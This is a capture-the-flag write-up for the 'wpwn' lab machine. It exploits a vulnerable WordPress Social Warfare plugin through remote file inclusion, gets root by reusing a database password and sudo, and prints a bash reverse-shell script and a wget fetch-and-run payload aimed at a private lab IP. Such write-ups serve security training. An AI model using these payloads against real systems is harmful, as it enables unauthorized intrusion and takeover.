# wpwn

netdiscover found this running on

```
192.168.1.178
```

a port scan revealed ports 22 and 80 were open.

port 80 is hosting wordpress in `/wordpress/`

we ran wpscan, which found a vulnerable plugin: `Social Warfare 3.5.2`

By reading EDB-46794 we found an endpoint that has potential for RFI.

We are able to get a shell by creating `shell.sh` with the following content:

```
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.1.109/8080 0>&1

```

we then started a listener, and  hosted this `payload` for RFI

```
<pre>system('wget http://192.168.1.109:80/shell.sh && /bin/bash shell.sh')</pre>
```

this gives us shell as `www-data`

linpeas findings

database

```
wordpress_db
```

db user

```
wp_user
```

db password

```
R3&]vzhHmMn9,:-5
```

We were able to find the admin hash in the `wp_users` table on this db.


We are able to login as `takis` using the DB password.

```
ssh takis@192.168.1.178
```

```
R3&]vzhHmMn9,:-5
```

takis is able to run any command with SUDO.

![[Pasted image 20220711013822.png]]

get root with
```
sudo su
```

we looked at a walkthrough to find the root flag:

```
find / root 2>/dev/null | grep USB
```

leads us to `/usr/games/usb/root`

## Root flag

![[Pasted image 20220711014055.png]]